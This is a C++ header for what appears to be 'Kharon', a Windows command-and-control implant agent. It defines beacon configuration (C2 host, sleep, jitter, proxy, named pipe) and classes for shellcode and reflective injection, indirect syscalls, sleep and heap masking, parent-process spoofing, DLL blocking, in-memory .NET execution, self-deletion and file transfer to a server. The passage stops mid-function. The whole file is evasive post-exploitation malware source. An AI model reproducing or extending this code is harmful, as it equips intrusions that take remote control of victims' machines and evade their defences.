#ifndef KHARON_H
#define KHARON_H

#include <windows.h>
#include <ntstatus.h>
#include <guiddef.h>

namespace mscorlib {
    #include <Mscoree.h>
}

#include <Clr.h>

#ifdef   WEB_WINHTTP
#include <winhttp.h>
#else
#include <wininet.h>
#endif

#include <KhError.h>
#include <Win32.h>
#include <Defines.h>
#include <Evasion.h>
#include <Misc.h>
#include <Communication.h>

EXTERN_C UPTR StartPtr();
EXTERN_C UPTR EndPtr();

/* ========= [ Config ] ========= */

#define KH_CHUNK_SIZE 512000 // 512 KB

#ifndef KH_AGENT_UUID
#define KH_AGENT_UUID ""
#endif // KH_AGENT_UUID

#ifndef KH_SLEEP_TIME
#define KH_SLEEP_TIME 3
#endif // KH_SLEEP_TIME

#ifndef KH_JITTER
#define KH_JITTER 100
#endif // KH_JITTER

#ifndef KH_INDIRECT_SYSCALL_ENABLED
#define KH_INDIRECT_SYSCALL_ENABLED FALSE
#endif // KH_INDIRECT_SYSCALL_ENABLED

#ifndef KH_INJECTION_PE 
#define KH_INJECTION_PE KhReflection
#endif // KH_INJECTION_PE

#ifndef KH_INJECTION_SC
#define KH_INJECTION_SC KhClassic
#endif // KH_INJECTION_SC

#ifndef KH_HEAP_MASK
#define KH_HEAP_MASK FALSE
#endif // KH_HEAP_MASK

#ifndef KH_SLEEP_MASK
#define KH_SLEEP_MASK MaskTimer
#endif // KH_SLEEP_MASK

#ifndef WEB_HOST
#define WEB_HOST {}
#endif // WEB_HOST

#ifndef WEB_CONN_QUANTITY
#define WEB_CONN_QUANTITY 1
#endif // WEB_CONN_QUANTITY

#ifndef WEB_PORT
#define WEB_PORT {}
#endif // WEB_PORT

#ifndef WEB_ENDPOINT
#define WEB_ENDPOINT { L"/data" }
#endif // WEB_ENDPOINT

#ifndef WEB_ENDPOINT_QUANTITY
#define WEB_ENDPOINT_QUANTITY 1
#endif // WEB_ENDPOINT_QUANTITY

#ifndef WEB_USER_AGENT
#define WEB_USER_AGENT L""
#endif // WEB_USER_AGENT

#ifndef WEB_HTTP_HEADERS
#define WEB_HTTP_HEADERS L""
#endif // WEB_HTTP_HEADERS

#ifndef WEB_SECURE_ENABLED
#define WEB_SECURE_ENABLED TRUE
#endif // WEB_SECURE_ENABLED

#ifndef WEB_PROXY_ENABLED
#define WEB_PROXY_ENABLED FALSE
#endif // WEB_PROXY_ENABLED

#ifndef WEB_PROXY_URL
#define WEB_PROXY_URL L""
#endif // WEB_PROXY_URL

#ifndef PIPE_NAME
#define PIPE_NAME ""
#endif // PIPE_NAME

class Dotnet;
class Memory;
class Mask;
class Injection;
class Package;
class Parser;
class Task;
class Thread;
class Process;
class Heap;
class Library;
class Transport;
class Token;

namespace Root {

    class Kharon {    
    public:
        Dotnet*    Dot;
        Library*   Lib;
        Token*     Tkn;
        Heap*      Hp;
        Process*   Ps;
        Thread*    Td;
        Memory*    Mm;
        Task*      Tk;
        Transport* Tsp;
        Mask*      Mk;
        Injection* Inj;
        Parser*    Psr;
        Package*   Pkg;
    
        struct {
            PCHAR CompName;
            PCHAR UserName;
            PCHAR DomName;
            PCHAR NetBios;
            PCHAR ProcessorName;
            ULONG ProcessorsNbr;
            ULONG AvalRAM;
            ULONG UsedRAM;
            ULONG TotalRAM;
            ULONG PercentRAM;
            ULONG OsArch;
            ULONG OsMjrV;
            ULONG OsMnrV;
            ULONG ProductType;
            ULONG OsBuild;
        } Machine = {};

        struct {
            PCHAR AgentID;
            ULONG SleepTime;
            ULONG Jitter;
            UPTR  HeapHandle;
            ULONG ProcessID;
            ULONG ParentID;
            ULONG ThreadID;
            ULONG ProcessArch;
            PCHAR CommandLine;
            PCHAR ImageName;
            PCHAR ImagePath;
            BOOL  Elevated;
            BOOL  Connected;

            struct {
                UPTR Start;
                UPTR Length;
            } Base;        
        } Session = {
            .AgentID     = KH_AGENT_UUID,
            .SleepTime   = KH_SLEEP_TIME * 1000,
            .Jitter      = KH_JITTER,
            .HeapHandle  = U_PTR( NtCurrentPeb()->ProcessHeap ),
            .Connected   = FALSE
        };

        struct {
            ULONG Qtt;
        } Job = {
            .Qtt = 1
        };

        struct {
            UPTR Dr0;
            UPTR Dr1;
            UPTR Dr2;
            UPTR Dr3;
        } Hwbp;

        struct {

        } SpoofCtx = {};

        struct {
            UPTR Handle;
    
            DECLAPI( LoadLibraryA ); 
            DECLAPI( GetProcAddress );
            DECLAPI( GetModuleHandleA );

            DECLAPI( DuplicateHandle );
            DECLAPI( SetHandleInformation );
            DECLAPI( GetStdHandle );
            DECLAPI( SetStdHandle );

            DECLAPI( GetConsoleWindow );
            DECLAPI( AllocConsole );

            DECLAPI( CreateFileA );
            DECLAPI( CreateFileW );
            DECLAPI( CreatePipe );
            DECLAPI( GetCurrentDirectoryA );
            DECLAPI( PeekNamedPipe );
            DECLAPI( ConnectNamedPipe );
            DECLAPI( CreateNamedPipeA );
            DECLAPI( CreateDirectoryA );
            DECLAPI( DeleteFileA );
            DECLAPI( CopyFileA );
            DECLAPI( MoveFileA );
            DECLAPI( ReadFile );
            DECLAPI( WriteFile );
            DECLAPI( WriteFileEx );
            DECLAPI( SetCurrentDirectoryA );
            DECLAPI( GetFileSize );
            DECLAPI( FileTimeToSystemTime );
            DECLAPI( FindFirstFileA );
            DECLAPI( FindNextFileA );
            DECLAPI( FindClose );
        
            DECLAPI( CreateProcessA );
            DECLAPI( OpenProcess );
            DECLAPI( IsWow64Process );
        
            DECLAPI( GetComputerNameExA );
        
            DECLAPI( OpenThread );
            DECLAPI( ResumeThread );
            DECLAPI( CreateThread );
            DECLAPI( CreateRemoteThread );
        
            DECLAPI( GlobalMemoryStatusEx );
            DECLAPI( GetNativeSystemInfo );
            DECLAPI( FormatMessageA );
        
            DECLAPI( WaitForSingleObject );
            DECLAPI( WaitForSingleObjectEx );

            DECLAPI( LocalAlloc   );
            DECLAPI( LocalReAlloc );
            DECLAPI( LocalFree    );
        
            DECLAPI( SetEvent );

            DECLAPI( VirtualProtect );
            DECLAPI( VirtualProtectEx );
            DECLAPI( VirtualAlloc );
            DECLAPI( VirtualAllocEx );
            DECLAPI( VirtualFreeEx );
            DECLAPI( VirtualFree );
            DECLAPI( WriteProcessMemory );

            DECLAPI( InitializeProcThreadAttributeList );
            DECLAPI( UpdateProcThreadAttribute );
            DECLAPI( DeleteProcThreadAttributeList );
        } Krnl32 = {
            RSL_TYPE( LoadLibraryA ),
            RSL_TYPE( GetProcAddress ),
            RSL_TYPE( GetModuleHandleA ),

            RSL_TYPE( DuplicateHandle ),
            RSL_TYPE( SetHandleInformation ),
            RSL_TYPE( GetStdHandle ),
            RSL_TYPE( SetStdHandle ),

            RSL_TYPE( GetConsoleWindow ),
            RSL_TYPE( AllocConsole ),
        
            RSL_TYPE( CreateFileA ),
            RSL_TYPE( CreateFileW ),
            RSL_TYPE( CreatePipe ),
            RSL_TYPE( GetCurrentDirectoryA ),
            RSL_TYPE( PeekNamedPipe ),
            RSL_TYPE( ConnectNamedPipe ),
            RSL_TYPE( CreateNamedPipeA ),
            RSL_TYPE( CreateDirectoryA ),
            RSL_TYPE( DeleteFileA ),
            RSL_TYPE( CopyFileA ),
            RSL_TYPE( MoveFileA ),
            RSL_TYPE( ReadFile ),
            RSL_TYPE( WriteFile ),
            RSL_TYPE( WriteFileEx ),
            RSL_TYPE( SetCurrentDirectoryA ),
            RSL_TYPE( GetFileSize ),
            RSL_TYPE( FileTimeToSystemTime ),
            RSL_TYPE( FindFirstFileA ),
            RSL_TYPE( FindNextFileA ),
            RSL_TYPE( FindClose ),
        
            RSL_TYPE( CreateProcessA ),
            RSL_TYPE( OpenProcess ),
            RSL_TYPE( IsWow64Process ),
        
            RSL_TYPE( GetComputerNameExA ),
        
            RSL_TYPE( OpenThread ),
            RSL_TYPE( ResumeThread ),
            RSL_TYPE( CreateThread ),
            RSL_TYPE( CreateRemoteThread ),
        
            RSL_TYPE( GlobalMemoryStatusEx ),
            RSL_TYPE( GetNativeSystemInfo ),
            RSL_TYPE( FormatMessageA ),
        
            RSL_TYPE( WaitForSingleObject ),
            RSL_TYPE( WaitForSingleObjectEx ),

            RSL_TYPE( LocalAlloc   ),
            RSL_TYPE( LocalReAlloc ),
            RSL_TYPE( LocalFree    ),

            RSL_TYPE( SetEvent ),
        
            RSL_TYPE( VirtualProtect ),
            RSL_TYPE( VirtualProtectEx ),
            RSL_TYPE( VirtualAlloc ),
            RSL_TYPE( VirtualAllocEx ),
            RSL_TYPE( VirtualFreeEx ),
            RSL_TYPE( VirtualFree ),
            RSL_TYPE( WriteProcessMemory ),

            RSL_TYPE( InitializeProcThreadAttributeList ),
            RSL_TYPE( UpdateProcThreadAttribute ),
            RSL_TYPE( DeleteProcThreadAttributeList )
        };

        struct {
            UPTR Handle;

            DECLAPI( DbgPrint );
            DECLAPI( NtClose );
    
            DECLAPI( NtAllocateVirtualMemory );
            DECLAPI( NtWriteVirtualMemory );
            DECLAPI( NtFreeVirtualMemory );
            DECLAPI( NtProtectVirtualMemory );
            DECLAPI( NtCreateSection );
            DECLAPI( NtMapViewOfSection );
    
            DECLAPI( NtOpenProcess );
            DECLAPI( NtCreateThreadEx ); 
            DECLAPI( NtOpenThread );
            DECLAPI( RtlExitUserThread );
            DECLAPI( RtlExitUserProcess );
    
            DECLAPI( RtlCaptureContext );
            DECLAPI( NtGetContextThread );
            DECLAPI( NtSetContextThread );
            DECLAPI( NtCreateEvent ); 
            DECLAPI( NtSetEvent );
            DECLAPI( NtContinue );
    
            DECLAPI( NtWaitForSingleObject );
            DECLAPI( NtSignalAndWaitForSingleObject );
    
            DECLAPI( NtSetInformationVirtualMemory );
    
            DECLAPI( NtQueryInformationToken );
            DECLAPI( NtQueryInformationProcess );
            DECLAPI( NtQuerySystemInformation );

            DECLAPI( NtTestAlert );
            DECLAPI( NtAlertResumeThread );
            DECLAPI( NtQueueApcThread );

            DECLAPI( RtlAllocateHeap   );
            DECLAPI( RtlReAllocateHeap );
            DECLAPI( RtlFreeHeap       );
    
            DECLAPI( RtlCreateTimer );
            DECLAPI( RtlDeleteTimer );
            DECLAPI( RtlCreateTimerQueue );
            DECLAPI( RtlDeleteTimerQueue );
        } Ntdll = {
            RSL_TYPE( DbgPrint ),
            RSL_TYPE( NtClose ),
    
            RSL_TYPE( NtAllocateVirtualMemory ),
            RSL_TYPE( NtWriteVirtualMemory ),
            RSL_TYPE( NtFreeVirtualMemory ),
            RSL_TYPE( NtProtectVirtualMemory ),
            RSL_TYPE( NtCreateSection ),
            RSL_TYPE( NtMapViewOfSection ),
    
            RSL_TYPE( NtOpenProcess ),
            RSL_TYPE( NtCreateThreadEx ),
            RSL_TYPE( NtOpenThread ),
            RSL_TYPE( RtlExitUserThread ),
            RSL_TYPE( RtlExitUserProcess ),
    
            RSL_TYPE( RtlCaptureContext ),
            RSL_TYPE( NtGetContextThread ),
            RSL_TYPE( NtSetContextThread ),
            RSL_TYPE( NtCreateEvent ),
            RSL_TYPE( NtSetEvent ),
            RSL_TYPE( NtContinue ),
    
            RSL_TYPE( NtWaitForSingleObject ),
            RSL_TYPE( NtSignalAndWaitForSingleObject ),
    
            RSL_TYPE( NtSetInformationVirtualMemory ),

            RSL_TYPE( NtQueryInformationToken ),
            RSL_TYPE( NtQueryInformationProcess ),
            RSL_TYPE( NtQuerySystemInformation ),
    
            RSL_TYPE( NtTestAlert ),
            RSL_TYPE( NtAlertResumeThread ),
            RSL_TYPE( NtQueueApcThread ),
    
            RSL_TYPE( RtlAllocateHeap   ),
            RSL_TYPE( RtlReAllocateHeap ),
            RSL_TYPE( RtlFreeHeap       ),

            RSL_TYPE( RtlCreateTimer ),
            RSL_TYPE( RtlDeleteTimer ),
            RSL_TYPE( RtlCreateTimerQueue ),
            RSL_TYPE( RtlDeleteTimerQueue ),
        };
           
        struct {
            UPTR Handle;

            DECLAPI( CommandLineToArgvW );
        } Shell32 = {
            RSL_TYPE( CommandLineToArgvW ),
        };

        struct {
            UPTR Handle;

            DECLAPI( ShowWindow );
        } User32 = {
            RSL_TYPE( ShowWindow ),
        };

        struct {
            UPTR Handle;

            DECLAPI( SafeArrayCreateVector );
            DECLAPI( SafeArrayCreate );
            DECLAPI( SysAllocString );
            DECLAPI( SafeArrayPutElement );
            DECLAPI( SafeArrayDestroy );
        } Oleaut32 = {
            RSL_TYPE( SafeArrayCreateVector ),
            RSL_TYPE( SafeArrayCreate ),
            RSL_TYPE( SysAllocString ),
            RSL_TYPE( SafeArrayPutElement ),
            RSL_TYPE( SafeArrayDestroy ),
        };

        struct {
            UPTR Handle;
            DECLAPI( LookupAccountSidW );
            DECLAPI( LookupAccountSidA );
            DECLAPI( OpenProcessToken    );
            DECLAPI( GetTokenInformation );

            DECLAPI( GetUserNameA );

            DECLAPI( RegOpenKeyExA    );
            DECLAPI( RegQueryValueExA );
            DECLAPI( RegCloseKey      );
        } Advapi32 = {
            RSL_TYPE( LookupAccountSidW ),
            RSL_TYPE( LookupAccountSidA ),
            RSL_TYPE( OpenProcessToken ),
            RSL_TYPE( GetTokenInformation ),

            RSL_TYPE( GetUserNameA ),

            RSL_TYPE( RegOpenKeyExA    ),
            RSL_TYPE( RegQueryValueExA ),
            RSL_TYPE( RegCloseKey      ),
        };

        struct {
            UPTR Handle;

            DECLAPI( SystemFunction040 );
            DECLAPI( SystemFunction041 );
        } Cryptbase = {
            RSL_TYPE( SystemFunction040 ),
            RSL_TYPE( SystemFunction041 ),
        };

        struct {
            UPTR Handle;

            DECLAPI( CLRCreateInstance );
        } Mscoree = {
            RSL_TYPE( CLRCreateInstance ),
        };

        struct {
            UPTR Handle;
    
            DECLAPI( InternetOpenW       );
            DECLAPI( InternetConnectW    );
            DECLAPI( HttpOpenRequestW    );
            DECLAPI( InternetSetOptionW  );
            DECLAPI( HttpSendRequestW    );
            DECLAPI( HttpQueryInfoW      );
            DECLAPI( InternetReadFile    );
            DECLAPI( InternetCloseHandle );
        } Wininet = {
            RSL_TYPE( InternetOpenW       ),
            RSL_TYPE( InternetConnectW    ),
            RSL_TYPE( HttpOpenRequestW    ),
            RSL_TYPE( InternetSetOptionW  ),
            RSL_TYPE( HttpSendRequestW    ),
            RSL_TYPE( HttpQueryInfoW      ),
            RSL_TYPE( InternetReadFile    ),
            RSL_TYPE( InternetCloseHandle ),
        };

        struct {

        } Winhttp = {};

        explicit Kharon();

        auto Init(
            VOID
        ) -> VOID;

        auto Start(
            _In_ UPTR Argument
        ) -> VOID;

        VOID InitDotnet( Dotnet* DotnetRf ) { Dot = DotnetRf; }
        VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
        VOID InitHeap( Heap* HeapRf ) { Hp = HeapRf; } 
        VOID InitLibrary( Library* LibRf ) { Lib = LibRf; }
        VOID InitThread( Thread* ThreadRf ) { Td = ThreadRf; }
        VOID InitProcess( Process* ProcessRf ) { Ps = ProcessRf; }
        VOID InitTask( Task* TaskRf ) { Tk = TaskRf; }
        VOID InitTransport( Transport* TransportRf ) { Tsp = TransportRf; }
        VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
        VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
        VOID InitMask( Mask* MaskRf ) { Mk = MaskRf; }
        VOID InitInjection( Injection* InjectionRf ) { Inj = InjectionRf; }
        VOID InitMemory( Memory* MemoryRf ) { Mm = MemoryRf; }
    };
}

class Dotnet {
private:
    Root::Kharon* Kh;
public:
    Dotnet( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    struct {
        GUID xCLSID_CLRMetaHost;
        GUID xCLSID_CorRuntimeHost;
        GUID xIID_AppDomain;
        GUID xIID_ICLRMetaHost;
        GUID xIID_ICLRRuntimeInfo;
        GUID xIID_ICorRuntimeHost;
    } GUID = {
        .xCLSID_CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
        .xCLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
        .xIID_AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
        .xIID_ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
        .xIID_ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
        .xIID_ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
    };

    struct {
        PWCHAR w; // pointer
        ULONG  s; // size
        PCHAR  a;
    } Buffer;

    BOOL KeepLoad;

    auto Inline(
        _In_ PBYTE AsmBytes,
        _In_ ULONG AsmLength,
        _In_ PWSTR Arguments,
        _In_ PWSTR AppDomName,
        _In_ PWSTR Version,
        _In_ BOOL  KeepLoad
    ) -> BOOL;
};

class Resolve {
private:
    Root::Kharon* Kh;
public:
    Resolve( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};


};

class Package {
private:
    Root::Kharon* Kh;

public:
    Package( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto Base64Enc(
        _In_ const unsigned char* in, 
        _In_ SIZE_T len
    ) -> char*;

    auto Base64Dec(
        const char* in, 
        unsigned char* out, 
        SIZE_T outlen
    ) -> INT;

    auto b64IsValidChar(char c) -> INT;

    auto Base64EncSize(
        _In_ SIZE_T inlen
    ) -> SIZE_T;

    auto Base64DecSize(
        _In_ const char* in
    ) -> SIZE_T;

    auto AddInt16( 
        _In_ PPACKAGE Package, 
        _In_ INT16    dataInt 
    ) -> VOID;

    auto AddInt32( 
        _In_ PPACKAGE Package, 
        _In_ INT32    dataInt
    ) -> VOID;

    auto AddInt64( 
        _In_ PPACKAGE Package, 
        _In_ INT64    dataInt 
    ) -> VOID;

    auto AddPad( 
        _In_ PPACKAGE Package, 
        _In_ PUCHAR   Data, 
        _In_ SIZE_T   Size 
    ) -> VOID;

    auto AddBytes( 
        _In_ PPACKAGE Package, 
        _In_ PUCHAR   Data, 
        _In_ SIZE_T   Size 
    ) -> VOID;

    auto AddByte( 
        _In_ PPACKAGE Package, 
        _In_ BYTE     dataInt 
    ) -> VOID;

    auto Create( 
        _In_ ULONG   CommandID,
        _In_ PPARSER Parser
    ) -> PPACKAGE;

    auto NewTask( 
        VOID
    ) -> PPACKAGE;

    auto Checkin(
        VOID
    ) -> PPACKAGE;

    auto Destroy( 
        _In_ PPACKAGE Package 
    ) -> VOID;

    auto Transmit( 
        _In_  PPACKAGE Package, 
        _Out_ PVOID*   Response, 
        _Out_ PUINT64  Size 
    ) -> BOOL;

    auto Error(
        _In_ ULONG ErrorCode
    ) -> VOID;

    auto AddString( 
        _In_ PPACKAGE package, 
        _In_ PCHAR    data 
    ) -> VOID;

    auto AddWString( 
        _In_ PPACKAGE package, 
        _In_ PWCHAR   data 
    ) -> VOID;
};

class Parser {
    private:
    Root::Kharon* Kh;
public:
    Parser( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto NewTask( 
        _In_ PPARSER parser, 
        _In_ PVOID   Buffer, 
        _In_ UINT64  size 
    ) -> VOID;

    auto New( 
        _In_ PPARSER parser, 
        _In_ PVOID   Buffer, 
        _In_ UINT64  size 
    ) -> VOID;

    auto Pad(
        _In_  PPARSER parser,
        _Out_ ULONG size
    ) -> PBYTE;

    auto GetByte(
        _In_ PPARSER Parser
    ) -> BYTE;

    auto GetInt16(
        _In_ PPARSER Parser
    ) -> INT16;

    auto GetInt32(
        _In_ PPARSER Parser
    ) -> INT32;

    auto GetInt64(
        _In_ PPARSER Parser
    ) -> INT64;

    auto GetBytes(
        _In_  PPARSER parser,
        _Out_ PULONG  size
    ) -> PBYTE;

    auto GetStr( 
        _In_ PPARSER parser, 
        _In_ PULONG  size 
    ) -> PCHAR;

    auto GetWstr(
        _In_ PPARSER parser, 
        _In_ PULONG  size 
    ) -> PWCHAR;

    auto Destroy(
        _In_ PPARSER Parser 
    ) -> BOOL;   
};

class Transport {    
private:
    Root::Kharon* Kh;
public:
    Transport( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    struct {
        PWCHAR Host;
        ULONG  Port;
        PWCHAR EndPoint;
        PWCHAR UserAgent;
        PWCHAR HttpHeaders;
        PWCHAR ProxyUrl;
        PWCHAR ProxyUsername;
        PWCHAR ProxyPassword;
        BOOL   ProxyEnabled;
        BOOL   Secure;
    } Web = {
        .Host         = WEB_HOST,
        .Port         = WEB_PORT,
        .EndPoint     = WEB_ENDPOINT,
        .UserAgent    = WEB_USER_AGENT,
        .HttpHeaders  = WEB_HTTP_HEADERS,
        .ProxyUrl     = WEB_PROXY_URL,
        .ProxyEnabled = WEB_PROXY_ENABLED,
        .Secure       = WEB_SECURE_ENABLED
    };

    struct {
        struct {
            PCHAR FileID;
            ULONG ChunkSize;
            ULONG CurrentChunk;
            ULONG TotalChunks;
            PCHAR Path;
        } Up;
        
        struct {

        } Down;
    } Tf;

    struct {
        PCHAR Name;
    } Pipe = {
        .Name = PIPE_NAME
    };

    auto Checkin(
        VOID
    ) -> BOOL;

    auto Send(
        _In_      PVOID   Data,
        _In_      UINT64  Size,
        _Out_opt_ PVOID  *RecvData,
        _Out_opt_ UINT64 *RecvSize
    ) -> BOOL;
};

class Task {
private:
    Root::Kharon* Kh;
public:
    Task( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto Dispatcher( 
        VOID 
    ) -> VOID;

    auto Injection(
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto Download(
        _In_ PPARSER Parser
    ) -> ERROR_CODE;
    
    auto Upload(
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto Config( 
        _In_ PPARSER Parser 
    ) -> ERROR_CODE;

    auto SelfDelete( 
        _In_ PPARSER Parser 
    ) -> ERROR_CODE;

    auto SleepMask( 
        _In_ PPARSER Parser 
    ) -> ERROR_CODE;

    auto SleepTime( 
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto Process( 
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto GetInfo( 
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto FileSystem( 
        _In_ PPARSER Parser 
    ) -> ERROR_CODE;

    auto Dotnet(
        _In_ PPARSER Parser 
    ) -> ERROR_CODE;

    auto Exit(
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    typedef auto ( Task::*TASK_FUNC )( PPARSER ) -> ERROR_CODE;

    struct {
        ULONG        ID;
        ERROR_CODE ( Task::*Run )( PPARSER );
    } Mgmt[TSK_LENGTH] = {
        Mgmt[0].ID = TkExit,       Mgmt[0].Run = &Task::Exit,
        Mgmt[1].ID = TkFileSystem, Mgmt[1].Run = &Task::FileSystem,
        Mgmt[2].ID = TkProcess,    Mgmt[2].Run = &Task::Process,
        Mgmt[3].ID = TkGetInfo,    Mgmt[3].Run = &Task::GetInfo,
        Mgmt[4].ID = TkSelfDelete, Mgmt[4].Run = &Task::SelfDelete,
        Mgmt[5].ID = TkInjection,  Mgmt[5].Run = &Task::Injection,
        Mgmt[6].ID = TkConfig,     Mgmt[6].Run = &Task::Config,
        Mgmt[7].ID = TkDownload,   Mgmt[7].Run = &Task::Download,
        Mgmt[8].ID = TkUpload,     Mgmt[8].Run = &Task::Upload,
        Mgmt[9].ID = TkDotnet,     Mgmt[9].Run = &Task::Dotnet,
    };
};

class Process {
private:
    Root::Kharon* Kh;
public:
    Process( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
    
    struct {
        ULONG ParentID;
        BOOL  BlockDlls;
        PCHAR CurrentDir;
        BOOL  Pipe;
    } Ctx = {
        .ParentID   = 0,
        .BlockDlls  = FALSE,
        .CurrentDir = 0,
        .Pipe       = TRUE
    };

    auto Open(
        _In_ ULONG RightsAccess,
        _In_ BOOL  InheritHandle,
        _In_ ULONG ProcessID
    ) -> HANDLE;

    auto Create(
        _In_  PPACKAGE             Package,
        _In_  PCHAR                CommandLine,
        _In_  ULONG                PsFlags,
        _Out_ PPROCESS_INFORMATION PsInfo
    ) -> BOOL;
};

class Thread {
    private:
    Root::Kharon* Kh;
public:
    Thread( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto RndEnum( 
        VOID
    ) -> ULONG;

    auto Create(
        _In_  HANDLE ProcessHandle,
        _In_  PVOID  StartAddress,
        _In_  PVOID  Parameter,
        _In_  ULONG  StackSize,
        _In_  ULONG  Flags,
        _Out_ PULONG ThreadID
    ) -> HANDLE;

    auto Open(
        _In_ ULONG RightAccess,
        _In_ BOOL  Inherit,
        _In_ ULONG ThreadID
    ) -> HANDLE;
};

class Library {
private:
    Root::Kharon* Kh;
public:
    Library( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto Load(
        _In_ PCHAR LibName
    ) -> UPTR;
};

class Token {
private:
    Root::Kharon* Kh;
public:
    Token( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto GetUser( 
        _Out_ PCHAR *UserNamePtr, 
        _Out_ ULONG *UserNameLen, 
        _In_  HANDLE TokenHandle 
    ) -> BOOL;

    auto ProcOpen(
        _In_ HANDLE  ProcessHandle,
        _In_ ULONG   RightsAccess,
        _In_ PHANDLE TokenHandle
    ) -> BOOL;
};

class Heap {
private:
    Root::Kharon* Kh;
public:
    Heap( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto DECLFN Alloc(
        _In_ ULONG Size
    ) -> PVOID;
    
    auto DECLFN ReAlloc(
        _In_ PVOID Block,
        _In_ ULONG Size
    ) -> PVOID;
    
    auto DECLFN Free(
        _In_ PVOID Block,
        _In_ ULONG Size
    ) -> BOOL;
};

class Memory {
private:
    Root::Kharon* Kh;
public:
    Memory( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto Alloc(
        _In_ HANDLE Handle,
        _In_ PVOID Base,
        _In_ ULONG Size,
        _In_ ULONG AllocType,
        _In_ ULONG Protect
    ) -> PVOID;

    auto Protect(
        _In_  HANDLE Handle,
        _In_  PVOID  Base,
        _In_  ULONG  Size,
        _In_  ULONG  NewProt,
        _Out_ PULONG OldProt
    ) -> BOOL;

    auto Write(
        _In_ HANDLE Handle,
        _In_ PVOID  Base,
        _In_ PBYTE  Buffer,
        _In_ ULONG  Size
    ) -> BOOL;

    auto Free(
        _In_ HANDLE Handle,
        _In_ PVOID  Base,
        _In_ ULONG  Size,
        _In_ ULONG  FreeType
    ) -> BOOL;
};

class Mask {
private:
    Root::Kharon* Kh;
public:
    Mask( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    struct {
        UPTR  NtContinueGadget;
        UPTR  JmpGadget;
        UINT8 TechniqueID;
        BOOL  Heap;
    } Ctx = {
        .TechniqueID = KH_SLEEP_MASK,
        .Heap        = KH_HEAP_MASK
    };

    auto FindGadget(
        _In_ UPTR   ModuleBase,
        _In_ UINT16 RegValue
    ) -> UPTR;

    auto Main(
        _In_ ULONG Time
    ) -> BOOL;

    auto Timer(
        _In_ ULONG Time
    ) -> BOOL;

    auto Apc(
        _In_ ULONG Time
    ) -> BOOL;

    auto Wait(
        _In_ ULONG Time
    ) -> BOOL;
};

class Injection {
private:
    Root::Kharon* Kh;
public:

    struct {
        struct {
            UINT8 TechniqueID;
        } PE;

        struct {
            UINT8 TechniqueID;
        } Sc; 

        struct {
            BOOL  Boolean;
            ULONG Length;
            PCHAR Name;
        } Pipe;

        struct {
            ULONG Length;
            PBYTE Buffer;
        } Param;
        
        BOOL  Spawn;
        BOOL  Syscall;

    } Ctx = {
        .PE = { .TechniqueID = KH_INJECTION_PE },
        .Sc = { .TechniqueID = KH_INJECTION_SC },
        .Syscall = KH_INDIRECT_SYSCALL_ENABLED
    };

    Injection( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto Classic(
        _In_      PBYTE   Buffer,
        _In_      UPTR    Size,
        _In_      PVOID   Param,
        _Out_opt_ PBYTE*  OutBuff,
        _Out_     PVOID*  Base,
        _Out_     HANDLE* ThreadHandle
    ) -> BOOL;

    auto Reflection(
        _In_ PBYTE  Buffer,
        _In_ ULONG  Size,
        _In_ PVOID  Param,
        _In_ PBYTE* OutBuff
    ) -> BOOL;
};

class ProcThreadAttrList: public Root::Kharon {
private:
    LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff;
    UPTR                         AttrSize;

public:
    DECLFN ProcThreadAttrList() : AttrBuff( 0 ), AttrSize( 0 ) {}

    auto DECLFN Initialize(
        _In_ UINT8 UpdateCount
    ) -> BOOL {
        INT3BRK
        Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
        AttrBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, AttrSize );

        return Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
    }

    auto DECLFN UpdateParentSpf(
        _In_ HANDLE ParentHandle
    ) -> BOOL {
        return Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentHandle, sizeof( HANDLE ), 0, 0 );
    }

    auto DECLFN UpdateBlockDlls(
        VOID
    ) -> BOOL {
        UINT64 Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
